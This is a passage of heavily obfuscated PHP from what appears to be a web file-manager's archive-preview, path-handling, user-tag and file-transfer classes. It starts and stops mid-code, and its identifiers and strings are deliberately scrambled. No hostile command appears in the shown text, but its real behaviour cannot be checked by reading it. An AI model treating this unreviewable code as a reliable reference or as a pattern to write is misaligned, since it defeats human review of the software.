$AÑÂ½á×˜ = self::fileExt($D±Ò˜ÖéÂ‚); $C¼ø¿Ç¥ã¨ = self::tmpFileName($D±Ò˜ÖéÂ‚); goto f¥ñ§İ¢„Ğ; BôËÇçó¿: $døÂÓ‘ï™§ = 50000; if (request_url_safe($CÓÕğ£”‚)) { $Dˆà¾†ÄÍ = parse_url_query($CÓÕğ£”‚); if (!isset($Dˆà¾†ÄÍ[$D¥µÑîÅÖ[75]])) { show_json($D¥µÑîÅÖ[1025], !1); } } $aƒéÑê§¿® = isset($Dˆà¾†ÄÍ) ? $Dˆà¾†ÄÍ[$D¥µÑîÅÖ[75]] : $CÓÕğ£”‚; goto f¶ø §†Î; ešÀ²áãÒ: return $cîÍç£Î¤ß[$D¥µÑîÅÖ[1022]]; goto CÇÖæ—Ç•Æ; f»¤›ƒÒ©á: $a»¯’Î©Ê˜ = json_encode($cîÍç£Î¤ß[$D¥µÑîÅÖ[1022]]); self::setContent($F ¡‡Ôë¬ß, $a»¯’Î©Ê˜); if (count($cîÍç£Î¤ß[$D¥µÑîÅÖ[1022]]) >= $døÂÓ‘ï™§) { show_json(sprintf(LNG($D¥µÑîÅÖ[1026]), count($cîÍç£Î¤ß[$D¥µÑîÅÖ[1022]])), !1); } goto ešÀ²áãÒ; f¥ñ§İ¢„Ğ: if (isset($Dˆà¾†ÄÍ)) { $a’ÖùïÉ´ä = array($Dˆà¾†ÄÍ[$D¥µÑîÅÖ[75]], $Dˆà¾†ÄÍ[$D¥µÑîÅÖ[1024]], $Dˆà¾†ÄÍ[$D¥µÑîÅÖ[28]]); $d ÏÛ¼œÅÂ = md5(implode($D¥µÑîÅÖ[70], $a’ÖùïÉ´ä)) . $D¥µÑîÅÖ[91] . get_path_ext($Dˆà¾†ÄÍ[$D¥µÑîÅÖ[28]]); } else { $a’ÖùïÉ´ä = array($D±Ò˜ÖéÂ‚[$D¥µÑîÅÖ[28]], $D±Ò˜ÖéÂ‚[$D¥µÑîÅÖ[75]], $D±Ò˜ÖéÂ‚[$D¥µÑîÅÖ[77]]); $d ÏÛ¼œÅÂ = md5(implode($D¥µÑîÅÖ[70], $a’ÖùïÉ´ä)) . $D¥µÑîÅÖ[91] . $AÑÂ½á×˜; } if ($e êáƒôÊº == -1) { $F ¡‡Ôë¬ß = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\x69\x65\x77\x2f{$C¼ø¿Ç¥ã¨}\57{$d ÏÛ¼œÅÂ}\56\x6c\157\x67"; $A¡‡Ëö•Ç‹ = self::infoFull($F ¡‡Ôë¬ß); if ($A¡‡Ëö•Ç‹) { $F ¡‡Ôë¬ß = $A¡‡Ëö•Ç‹[$D¥µÑîÅÖ[75]]; $Eê¢ÈÊ°ùĞ = self::getContent($F ¡‡Ôë¬ß); if ($Eê¢ÈÊ°ùĞ) { $a»¯’Î©Ê˜ = json_decode($Eê¢ÈÊ°ùĞ, !0); if (count($a»¯’Î©Ê˜) >= $døÂÓ‘ï™§) { show_json(sprintf(LNG($D¥µÑîÅÖ[1026]), count($a»¯’Î©Ê˜)), !1); } return $a»¯’Î©Ê˜; } } else { $F ¡‡Ôë¬ß = self::mkfile($F ¡‡Ôë¬ß); } } $EÒ’ñÌµÁ“ = TEMP_FILES . $C¼ø¿Ç¥ã¨; goto AŠŞÓÈØÓ; c©œğÄÜ•’: $D¥µÑîÅÖ =& $_SERVER[»„]; $CÓÕğ£”‚ = $E²ô·Ã î[$D¥µÑîÅÖ[75]]; $e êáƒôÊº = isset($E²ô·Ã î[$D¥µÑîÅÖ[1024]]) ? $E²ô·Ã î[$D¥µÑîÅÖ[1024]] : -1; goto BôËÇçó¿; AŠŞÓÈØÓ: if (!is_dir($EÒ’ñÌµÁ“)) { mk_dir($EÒ’ñÌµÁ“); } $B¼Œ‘Ù§Õ¸ = $EÒ’ñÌµÁ“ . $D¥µÑîÅÖ[8] . $d ÏÛ¼œÅÂ; if (!@file_exists(self::iconvSystem($B¼Œ‘Ù§Õ¸))) { if (isset($Dˆà¾†ÄÍ)) { url_request($CÓÕğ£”‚, $D¥µÑîÅÖ[1027], $B¼Œ‘Ù§Õ¸); } else { $eâçÃ…ê¶Ë = self::localFilePath($CÓÕğ£”‚, $AÑÂ½á×˜); $B¼Œ‘Ù§Õ¸ = $eâçÃ…ê¶Ë ? $eâçÃ…ê¶Ë : self::download($CÓÕğ£”‚, $B¼Œ‘Ù§Õ¸); } } goto A•†¼È½¦; DÖªééÓäÜ: self::archiveExt(); del_dir($EÒ’ñÌµÁ“); if (!$cîÍç£Î¤ß[$D¥µÑîÅÖ[1020]]) { show_json($cîÍç£Î¤ß[$D¥µÑîÅÖ[1022]], !1); } goto f»¤›ƒÒ©á; A•†¼È½¦: $B¼Œ‘Ù§Õ¸ = self::iconvSystem($B¼Œ‘Ù§Õ¸); if ($e êáƒôÊº >= 0) { $D³Œçãƒ—Š = isset($E²ô·Ã î[$D¥µÑîÅÖ[1028]]) ? $E²ô·Ã î[$D¥µÑîÅÖ[1028]] : !1; $bµÇôœ£É± = isset($E²ô·Ã î[$D¥µÑîÅÖ[28]]) ? $E²ô·Ã î[$D¥µÑîÅÖ[28]] : $D¥µÑîÅÖ[33]; KodArchive::filePreview($B¼Œ‘Ù§Õ¸, $e êáƒôÊº, $D³Œçãƒ—Š, $bµÇôœ£É±); self::archiveExt(); die; } $cîÍç£Î¤ß = KodArchive::listContent($B¼Œ‘Ù§Õ¸); goto DÖªééÓäÜ; CÇÖæ—Ç•Æ: } private static function fileExt($céšˆùÓÈ÷) { $F»™Í›Ì» =& $_SERVER[»„]; $BÓÙ¨«øÊÓ = $céšˆùÓÈ÷[$F»™Í›Ì»[156]]; if ($BÓÙ¨«øÊÓ == $F»™Í›Ì»[1029]) { $e‚¬¶îİå© = $F»™Í›Ì»[1030]; if (substr($céšˆùÓÈ÷[$F»™Í›Ì»[28]], -strlen($e‚¬¶îİå©)) == $e‚¬¶îİå©) { $BÓÙ¨«øÊÓ = $F»™Í›Ì»[1031]; } } self::archiveExt($BÓÙ¨«øÊÓ); return $BÓÙ¨«øÊÓ; } private static function zipFileList($CÔ‰Á‰ê, $bÒ†İ¾ó¹ = false) { $cÇƒ‹Šîğ½ =& $_SERVER[»„]; $FÒ•öÖ“± = array(); foreach ($CÔ‰Á‰ê as $CÛù«°¸ÍÒ) { $Eîª×éÕ¥… = $CÛù«°¸ÍÒ[$cÇƒ‹Šîğ½[75]]; if ($bÒ†İ¾ó¹) { $Eîª×éÕ¥… = self::copy($CÛù«°¸ÍÒ[$cÇƒ‹Šîğ½[75]], $bÒ†İ¾ó¹, $cÇƒ‹Šîğ½[732]); } if ($Eîª×éÕ¥… && self::local()->exist($Eîª×éÕ¥…)) { $FÒ•öÖ“±[$CÛù«°¸ÍÒ[$cÇƒ‹Šîğ½[75]]] = $Eîª×éÕ¥…; } } if (!empty($FÒ•öÖ“±)) { return array_values($FÒ•öÖ“±); } show_json(LNG($cÇƒ‹Šîğ½[1032]), !1); } public static function tmpFileName($bÖÌ²§œª) { $Eäî—¶³ç =& $_SERVER[»„]; $BçØÍ½¯Ç = array($bÖÌ²§œª[$Eäî—¶³ç[28]], $bÖÌ²§œª[$Eäî—¶³ç[75]], $bÖÌ²§œª[$Eäî—¶³ç[77]], $bÖÌ²§œª[$Eäî—¶³ç[455]]); return md5(implode($Eäî—¶³ç[70], $BçØÍ½¯Ç)); } private static function localFilePath($bÈô²ÇšÀ•, $A·ÎùïÛªÃ) { goto Cøƒ¡®ç†ó; Cøƒ¡®ç†ó: $d¤ª—ïÏ¥… =& $_SERVER[»„]; if ($A·ÎùïÛªÃ == $d¤ª—ïÏ¥…[1033] && strtoupper(substr(PHP_OS, 0, 3)) == $d¤ª—ïÏ¥…[1034]) { return !1; } $bÀÜ¶ë‹ƒ = KodIO::parse($bÈô²ÇšÀ•); goto E“õ–æèˆÓ; E“õ–æèˆÓ: if ($bÀÜ¶ë‹ƒ[$d¤ª—ïÏ¥…[29]] == KodIO::KOD_SOURCE) { $AÂÉ¦Ü’ì» = Model($d¤ª—ïÏ¥…[740])->fileInfoGet(KodIO::sourceID($bÈô²ÇšÀ•)); if (!$AÂÉ¦Ü’ì»[$d¤ª—ïÏ¥…[75]]) { show_json($d¤ª—ïÏ¥…[1035], !1); } $bÈô²ÇšÀ• = $AÂÉ¦Ü’ì»[$d¤ª—ïÏ¥…[75]]; } $EåÜÚ¯–…ò = self::init($bÈô²ÇšÀ•); $a¿¥ÚĞ’ì« = $EåÜÚ¯–…ò->getType(); goto d«Âíòèİ; d«Âíòèİ: if ($a¿¥ÚĞ’ì« == $d¤ª—ïÏ¥…[101] || $a¿¥ÚĞ’ì« == $d¤ª—ïÏ¥…[1036]) { if (!$EåÜÚ¯–…ò->exist($EåÜÚ¯–…ò->path)) { show_json(LNG($d¤ª—ïÏ¥…[100]), !1); } return $EåÜÚ¯–…ò->path; } return !1; goto Fˆ÷†ÆÆ†; Fˆ÷†ÆÆ†: } private static function archiveExt($eŞç˜”èöí = '') { $GLOBALS[$_SERVER[»„][1037]] = $eŞç˜”èöí; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\x72\x52\145\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\173\165\163\x65\162\x46\x69\x6c\145\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\x46\151\x6c\x65\124\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\160\x52\157\x6f\164\123\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\150\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\123\x68\141\162\x65\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\145\111\164\145\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\x65\111\x74\x65\155\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\145\x6e\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\x65\162\175"; public static function typeList() { $BÇÛ¾ ‡»â =& $_SERVER[»„]; return array($BÇÛ¾ ‡»â[1038] => self::KOD_SOURCE, $BÇÛ¾ ‡»â[1039] => self::KOD_USER_RECYCLE, $BÇÛ¾ ‡»â[1040] => self::KOD_USER_FAV, $BÇÛ¾ ‡»â[1041] => self::KOD_USER_FILE_TAG, $BÇÛ¾ ‡»â[1042] => self::KOD_USER_FILE_TYPE, $BÇÛ¾ ‡»â[1043] => self::KOD_GROUP_ROOT_SELF, $BÇÛ¾ ‡»â[1044] => self::KOD_USER_SHARE, $BÇÛ¾ ‡»â[1045] => self::KOD_USER_SHARE_LINK, $BÇÛ¾ ‡»â[1046] => self::KOD_USER_SHARE_TO_ME, $BÇÛ¾ ‡»â[1047] => self::KOD_SHARE_ITEM, $BÇÛ¾ ‡»â[1048] => self::KOD_SHARE_LINK, $BÇÛ¾ ‡»â[1049] => self::KOD_SEARCH, $BÇÛ¾ ‡»â[1050] => self::KOD_BLOCK, $BÇÛ¾ ‡»â[1051] => self::KOD_IO, $BÇÛ¾ ‡»â[1052] => self::KOD_USER_RECENT, $BÇÛ¾ ‡»â[1053] => self::KOD_USER_DRIVER); } public static function parse($F««é‡¥Ö) { goto f¨ÀëÖ÷Ú; AääùÍ¤ã¸: $D©á¸ñ÷ = array($c„ƒÌ”¥Ú‹[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[1058]] = in_array($cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[29]], $D©á¸ñ÷); return $cÔæ¢êÈ·; goto D×¨ù‘Äİ®; f¨ÀëÖ÷Ú: $c„ƒÌ”¥Ú‹ =& $_SERVER[»„]; $F««é‡¥Ö = self::clear($F««é‡¥Ö); $BÙâ‚ÑÒß¾ = array_values(self::typeList()); goto A‡ÊÍòÇ; A‡ÊÍòÇ: preg_match($c„ƒÌ”¥Ú‹[1054], $F««é‡¥Ö, $e“À›ñ—¬); $cÔæ¢êÈ· = array($c„ƒÌ”¥Ú‹[384] => !1, $c„ƒÌ”¥Ú‹[1055] => !1, $c„ƒÌ”¥Ú‹[381] => !1, $c„ƒÌ”¥Ú‹[75] => $F««é‡¥Ö, $c„ƒÌ”¥Ú‹[1000] => !1, $c„ƒÌ”¥Ú‹[999] => $c„ƒÌ”¥Ú‹[33]); if (is_array($e“À›ñ—¬) && count($e“À›ñ—¬) == 5) { $fáŸÔªÄ… = $c„ƒÌ”¥Ú‹[1056] . $e“À›ñ—¬[2] . $c„ƒÌ”¥Ú‹[311]; if (in_array($fáŸÔªÄ…, $BÙâ‚ÑÒß¾)) { $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[1000]] = $e“À›ñ—¬[1]; $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[29]] = $fáŸÔªÄ…; $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[1057]] = substr($fáŸÔªÄ…, 1, -1); $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[363]] = $e“À›ñ—¬[3]; } $cÔæ¢êÈ·[$c„ƒÌ”¥Ú‹[999]] = $e“À›ñ—¬[4]; } goto AääùÍ¤ã¸; D×¨ù‘Äİ®: } public static function clear($bÑ½”Ş‚­³) { goto b³ÜİÁ‘ŞŞ; c«Š‹ƒ³±İ: if ($bÑ½”Ş‚­³ == $f‹°ŞÜøÊ[8]) { return $f‹°ŞÜøÊ[8]; } $bÑ½”Ş‚­³ = rtrim($bÑ½”Ş‚­³, $f‹°ŞÜøÊ[8]); return $bÑ½”Ş‚­³; goto C«¢•¥œµö; b³ÜİÁ‘ŞŞ: $f‹°ŞÜøÊ =& $_SERVER[»„]; $bÑ½”Ş‚­³ = str_replace($f‹°ŞÜøÊ[93], $f‹°ŞÜøÊ[8], $bÑ½”Ş‚­³); $c™®«ÔÂÖÎ = $f‹°ŞÜøÊ[1059]; goto E½ºñÉ—­; E½ºñÉ—­: if (substr($bÑ½”Ş‚­³, 0, 3) == $f‹°ŞÜøÊ[1060]) { $bÑ½”Ş‚­³ = substr($bÑ½”Ş‚­³, 3); } while (strstr($bÑ½”Ş‚­³, $c™®«ÔÂÖÎ)) { $bÑ½”Ş‚­³ = str_replace($c™®«ÔÂÖÎ, $f‹°ŞÜøÊ[8], $bÑ½”Ş‚­³); } $bÑ½”Ş‚­³ = preg_replace($f‹°ŞÜøÊ[1061], $f‹°ŞÜøÊ[8], $bÑ½”Ş‚­³); goto c«Š‹ƒ³±İ; C«¢•¥œµö: } public static function sourceID($d¦æâ›ïØİ) { $A»Ş­•¡¿ô =& $_SERVER[»„]; $DÀ×¹œ×ÇÇ = self::parse($d¦æâ›ïØİ); if ($DÀ×¹œ×ÇÇ[$A»Ş­•¡¿ô[29]] !== self::KOD_SOURCE) { show_json(LNG($A»Ş­•¡¿ô[1062]), !1); } return $DÀ×¹œ×ÇÇ[$A»Ş­•¡¿ô[363]]; } public static function make($bÂ§Â—ƒì¯) { if (!$bÂ§Â—ƒì¯) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bÂ§Â—ƒì¯)); } public static function makeShare($DÏ¥à‰’‘, $b‚­Ù»Æ‚) { return self::makePath(self::KOD_SHARE_ITEM, $DÏ¥à‰’‘, $b‚­Ù»Æ‚); } public static function makeFileTypePath($cï©«Ù·Ã) { return self::makePath(self::KOD_USER_FILE_TYPE, $cï©«Ù·Ã); } public static function makeFileTagPath($D“Õ´„×) { return self::makePath(self::KOD_USER_FILE_TAG, $D“Õ´„×); } public static function makePath($C…ØøĞŠŞ¤, $fÌÌİ¨‚”è = '', $dã·ô¨¦ñ‚ = '') { $F…Ê×‹«Á¯ =& $_SERVER[»„]; $dˆÂ»›ğ‚ = substr($C…ØøĞŠŞ¤, 1, -1); $E¹³Î™Óš¶ = $F…Ê×‹«Á¯[1063] . $dˆÂ»›ğ‚ . $F…Ê×‹«Á¯[1064] . $fÌÌİ¨‚”è . $F…Ê×‹«Á¯[1065]; $E¹³Î™Óš¶ = $dã·ô¨¦ñ‚ ? $E¹³Î™Óš¶ . $dã·ô¨¦ñ‚ . $F…Ê×‹«Á¯[8] : $E¹³Î™Óš¶; return $E¹³Î™Óš¶; } public static function hashPath($A¢·ª½Íâœ) { $aïĞ»«’½è =& $_SERVER[»„]; $dáŠÑÍğë” = is_array($A¢·ª½Íâœ) ? $A¢·ª½Íâœ : IO::info($A¢·ª½Íâœ); $AÀ§¯¦ „Ğ = _get($dáŠÑÍğë”, $aïĞ»«’½è[1066], $aïĞ»«’½è[33]); if (!$AÀ§¯¦ „Ğ) { $A‘À†·¦™å = KodIO::parse($dáŠÑÍğë”[$aïĞ»«’½è[75]]); if (!$A‘À†·¦™å[$aïĞ»«’½è[29]]) { $AÀ§¯¦ „Ğ = IO::hashSimple($dáŠÑÍğë”[$aïĞ»«’½è[75]]); } } if (!$AÀ§¯¦ „Ğ) { $AÀ§¯¦ „Ğ = md5($dáŠÑÍğë”[$aïĞ»«’½è[75]] . $dáŠÑÍğë”[$aïĞ»«’½è[77]] . $dáŠÑÍğë”[$aïĞ»«’½è[106]]); } return $AÀ§¯¦ „Ğ; } public static function initSystemPath() { $B’ÌŞê² =& $_SERVER[»„]; if (defined($B’ÌŞê²[1067])) { return; } define($B’ÌŞê²[1067], self::systemPath($B’ÌŞê²[1068])); define($B’ÌŞê²[1069], self::systemPath($B’ÌŞê²[1070])); define($B’ÌŞê²[1071], self::systemPath($B’ÌŞê²[1072])); define($B’ÌŞê²[1073], self::systemPath($B’ÌŞê²[1074])); } private static function systemPath($däŠòº¦Ì) { goto eÎ†ƒãÓµœ; F•Â™‡à¸ø: if ($d‰†ïÈíî«) { return $d‰†ïÈíî«; } if ($däŠòº¦Ì == $C¼Å°à×¸ö[1068]) { $d‰†ïÈíî« = self::make(Model($C¼Å°à×¸ö[740])->systemRootPathAdd($C¼Å°à×¸ö[1077])); } else { $d‰†ïÈíî« = self::systemPath($C¼Å°à×¸ö[1068]); $F…ƒÓÂŒµË = self::sourceID($d‰†ïÈíî«); $d‰†ïÈíî« = self::make(Model($C¼Å°à×¸ö[740])->mkdir($F…ƒÓÂŒµË, $däŠòº¦Ì)); } Model($C¼Å°à×¸ö[1076])->set($C¸…ğ†õÚ¶, $d‰†ïÈíî«); goto D¸¥ÀÁ¼¦Ç; eÎ†ƒãÓµœ: $C¼Å°à×¸ö =& $_SERVER[»„]; $C¸…ğ†õÚ¶ = $C¼Å°à×¸ö[1075] . ucfirst($däŠòº¦Ì); $d‰†ïÈíî« = Model($C¼Å°à×¸ö[1076])->get($C¸…ğ†õÚ¶); goto F•Â™‡à¸ø; D¸¥ÀÁ¼¦Ç: return $d‰†ïÈíî«; goto CÒ¶ÚÍé‚; CÒ¶ÚÍé‚: } public static function systemFolder($bº ½æ‡‚–) { $cÊñİ›Ô‡ = IO_PATH_SYSTEM_SOURCE . $bº ½æ‡‚–; $F¢ô´§´¼Ì = Cache::get($cÊñİ›Ô‡); if (!$F¢ô´§´¼Ì) { $bù„¨öºª = IO::infoFull($cÊñİ›Ô‡); if (!$bù„¨öºª) { $F¢ô´§´¼Ì = IO::mkdir($cÊñİ›Ô‡, REPEAT_SKIP); } else { $F¢ô´§´¼Ì = $bù„¨öºª[$_SERVER[»„][75]]; } Cache::set($cÊñİ›Ô‡, $F¢ô´§´¼Ì, 3600 * 10); } return $F¢ô´§´¼Ì; } public static function defaultDriver() { return Model($_SERVER[»„][692])->defaultDriver(); } public static function defaultIO() { $AáµÂ¥ï»Ò =& $_SERVER[»„]; $Aµ¨µÈ—¯ = self::defaultDriver(); return $AáµÂ¥ï»Ò[1078] . $Aµ¨µÈ—¯[$AáµÂ¥ï»Ò[363]] . $AáµÂ¥ï»Ò[1065]; } public static function fileTypeList() { $c¢ŒŞÆÁÒ­ =& $_SERVER[»„]; $f±ë¾•ƒÍ· = $GLOBALS[$c¢ŒŞÆÁÒ­[6]][$c¢ŒŞÆÁÒ­[1079]]; foreach ($f±ë¾•ƒÍ· as $AôÕ‘¼•¯÷ => $FÚ¥Ÿâ¡ç) { $Fª½Œ¥ƒÉÑ = $c¢ŒŞÆÁÒ­[1080] . $AôÕ‘¼•¯÷; $DŸÊ®£×Âá = LNG($Fª½Œ¥ƒÉÑ); if ($Fª½Œ¥ƒÉÑ != $DŸÊ®£×Âá) { $f±ë¾•ƒÍ·[$AôÕ‘¼•¯÷][$c¢ŒŞÆÁÒ­[28]] = $DŸÊ®£×Âá; } } return $f±ë¾•ƒÍ·; } } goto D¼‡¯ÕÛ; c¦÷ë÷âåÎ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($C»ÚÜ¦İ‡) { $Fù¥‡Ï•Ñ =& $_SERVER[»„]; if (!defined($Fù¥‡Ï•Ñ[423])) { define($Fù¥‡Ï•Ñ[423], 0); } return "\x55\163\145\162\117\160\x74\151\x6f\x6e\x5f{$C»ÚÜ¦İ‡}\137" . USER_ID; } protected function filterWhere($b°©Ï¬ëô¿) { $BÏôÛ£¾ÀÚ =& $_SERVER[»„]; if (!defined($BÏôÛ£¾ÀÚ[423])) { define($BÏôÛ£¾ÀÚ[423], 0); } $b°©Ï¬ëô¿[$BÏôÛ£¾ÀÚ[1409]] = USER_ID; return $b°©Ï¬ëô¿; } public function cacheRemoveUser($aîÌÃ‚›‹, $c™öéÅ°âë) { return Cache::remove("\x55\163\145\162\x4f\x70\x74\x69\157\156\x5f{$aîÌÃ‚›‹}\x5f" . $c™öéÅ°âë); } protected function optionDefault($A±µôÄê† = '') { $b¥¥Éèó‡Õ =& $_SERVER[»„]; if ($A±µôÄê† == $b¥¥Éèó‡Õ[33]) { return $GLOBALS[$b¥¥Éèó‡Õ[6]][$b¥¥Éèó‡Õ[2506]]; } if ($A±µôÄê† == $b¥¥Éèó‡Õ[2507]) { return $GLOBALS[$b¥¥Éèó‡Õ[6]][$b¥¥Éèó‡Õ[2508]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\56\x74\141\x67\114\151\x73\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\151\157\x6e"; public $field = array("\156\x61\155\x65", "\163\x74\x79\x6c\145", "\163\x6f\x72\x74"); public function listData($FçÚ«†ù· = false, $b†ÁŒ½¾†™ = "\163\157\162\x74", $Cà‰½ôäåÊ = false) { return parent::listData($FçÚ«†ù·, $b†ÁŒ½¾†™, $Cà‰½ôäåÊ); } public function remove($AÜ„ñçÜÖ²) { return parent::remove($AÜ„ñçÜÖ²); } public function add($DŠĞÊ­éäª, $Eäá›É•µ = "\x6c\141\x62\x65\154\55\147\x72\145\171\x2d\156\157\162\x6d\141\x6c") { $A££¥±«  =& $_SERVER[»„]; if ($this->findByName($DŠĞÊ­éäª)) { return !1; } $cæëŸäôÍ¨ = array($A££¥±« [382] => $DŠĞÊ­éäª, $A££¥±« [433] => $Eäá›É•µ, $A££¥±« [2076] => $this->getSort($A££¥±« [242]) + 1); return parent::insert($cæëŸäôÍ¨); } public function update($Eè³¨İ¾±Û, $BßÁ°¬ÂÈã) { $Dó°áê»ùí =& $_SERVER[»„]; $e‰ƒ§˜Í±ù = $this->listData($Eè³¨İ¾±Û); $bÂ’İ„¬æ = $this->findByName($BßÁ°¬ÂÈã[$Dó°áê»ùí[28]]); if (!$e‰ƒ§˜Í±ù || $bÂ’İ„¬æ && $bÂ’İ„¬æ[$Dó°áê»ùí[363]] != $e‰ƒ§˜Í±ù[$Dó°áê»ùí[363]]) { return !1; } return parent::update($Eè³¨İ¾±Û, $BßÁ°¬ÂÈã); } public function moveTop($f’öîÏ˜ö) { $A¦¸æ¿É®‰ =& $_SERVER[»„]; $C­Û´Ÿ–„Ü = parent::listData(); $b¢ÎÁ‘éÀ‘ = $this->getSort($A¦¸æ¿É®‰[241]); foreach ($C­Û´Ÿ–„Ü as &$dÌâ¢ö‚˜’) { if ($dÌâ¢ö‚˜’[$A¦¸æ¿É®‰[363]] == $f’öîÏ˜ö) { $dÌâ¢ö‚˜’[$A¦¸æ¿É®‰[2093]] = $b¢ÎÁ‘éÀ‘; continue; } $dÌâ¢ö‚˜’[$A¦¸æ¿É®‰[2093]] += 1; } return parent::resetData($C­Û´Ÿ–„Ü); } public function moveBottom($BŸàÂ¾Òâ) { $f©¼¥åÃòˆ =& $_SERVER[»„]; $c´”¤Èìèµ = $this->getSort($f©¼¥åÃòˆ[242]) + 1; return parent::update($BŸàÂ¾Òâ, array($f©¼¥åÃòˆ[2093] => $c´”¤Èìèµ)); } public function resetSort($bâ«ªÊ™‚) { goto F§éÚõïİ; b‡¥«¾Áç: for ($c¡’ßø”Ç = 0; $c¡’ßø”Ç < count($bâ«ªÊ™‚); $c¡’ßø”Ç++) { $F”¥¼áãæ[$bâ«ªÊ™‚[$c¡’ßø”Ç] . $Eİéâ•šÃ[33]] = $c¡’ßø”Ç + 1; } $DëÎæá¤©• = parent::listData(); foreach ($DëÎæá¤©• as &$E¿®‚“ã¤è) { $c÷ÚÚÁìŸÑ = $F”¥¼áãæ[$E¿®‚“ã¤è[$Eİéâ•šÃ[363]]]; $E¿®‚“ã¤è[$Eİéâ•šÃ[2093]] = $c÷ÚÚÁìŸÑ ? $c÷ÚÚÁìŸÑ : $E¿®‚“ã¤è[$Eİéâ•šÃ[2093]]; } goto B„„Ç²¨; F§éÚõïİ: $Eİéâ•šÃ =& $_SERVER[»„]; $F”¥¼áãæ = array(); $bâ«ªÊ™‚ = is_array($bâ«ªÊ™‚) ? $bâ«ªÊ™‚ : array(); goto b‡¥«¾Áç; B„„Ç²¨: return parent::resetData($DëÎæá¤©•); goto fÌØÜŒ¼´ù; fÌØÜŒ¼´ù: } private function getSort($bî§ÔôàÔõ) { $E˜¿ø„äŠ =& $_SERVER[»„]; $e¥Õƒ…ù÷Ó = parent::listData(); $C÷«ãƒÖó = array_to_keyvalue($e¥Õƒ…ù÷Ó, $E˜¿ø„äŠ[33], $E˜¿ø„äŠ[2093]); if (!$C÷«ãƒÖó) { $C÷«ãƒÖó = array(0); } $B¤¼ ê‹ = $bî§ÔôàÔõ == $E˜¿ø„äŠ[242] ? max($C÷«ãƒÖó) : min($C÷«ãƒÖó); return intval($B¤¼ ê‹); } } goto a„å±áÃ; eŒš£ÆíŒ¿: class TaskFileTransfer extends Task { protected function startAfter() { goto a·¼´™–Áº; dŞÃº²¶Ø…: if (!$D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1316]]) { $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1316]] = LNG($B™‰õ¶–¼ˆ[1458]); } goto F¢¦çµ®¾„; Bó÷í†Öá: Hook::bind($B™‰õ¶–¼ˆ[1443], array($this, $B™‰õ¶–¼ˆ[1444])); Hook::bind($B™‰õ¶–¼ˆ[528], array($this, $B™‰õ¶–¼ˆ[1445])); $this->sourceModelCopyFlag = !1; goto eˆ¾Àã÷ôŞ; f¾±ä•¤Ò«: Hook::bind($B™‰õ¶–¼ˆ[1433], array($this, $B™‰õ¶–¼ˆ[1434])); Hook::bind($B™‰õ¶–¼ˆ[1435], array($this, $B™‰õ¶–¼ˆ[1436])); Hook::bind($B™‰õ¶–¼ˆ[1437], array($this, $B™‰õ¶–¼ˆ[1438])); goto B—äøÌÅ©ç; E´ÑñÄÅã¶: $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[968]] = $B™‰õ¶–¼ˆ[33]; $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1456]] = $B™‰õ¶–¼ˆ[33]; $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1457]] = 0; goto dŞÃº²¶Ø…; cŸèù Á¾: Hook::bind($B™‰õ¶–¼ˆ[539], array($this, $B™‰õ¶–¼ˆ[1441])); Hook::bind($B™‰õ¶–¼ˆ[505], array($this, $B™‰õ¶–¼ˆ[1442])); Hook::bind($B™‰õ¶–¼ˆ[502], array($this, $B™‰õ¶–¼ˆ[1442])); goto c„¬‹‘™¤; fºİ˜à Àè: $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1452]] = LNG($B™‰õ¶–¼ˆ[1453]); $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1454]] = 0; $D‰Ë‹½°âÒ[$B™‰õ¶–¼ˆ[1455]] = 0; goto E´ÑñÄÅã¶; c„¬‹‘™¤: Hook::bind($B™‰õ¶–¼ˆ[507], array($this, $B™‰õ¶–¼ˆ[1442])); Hook::bind($B™‰õ¶–¼ˆ[509], array($this, $B™‰õ¶–¼ˆ[1442])); Hook::bind($B™‰õ¶–¼ˆ[511], array($this, $B™‰õ¶–¼ˆ[1442])); goto Bó÷í†Öá; B—äøÌÅ©ç: Hook::bind($B™‰õ¶–¼ˆ[535], array($this, $B™‰õ¶–¼ˆ[1439])); Hook::bind($B™‰õ¶–¼ˆ[536], array($this, $B™‰õ¶–¼ˆ[1440])); Hook::bind($B™‰õ¶–¼ˆ[538], array($this, 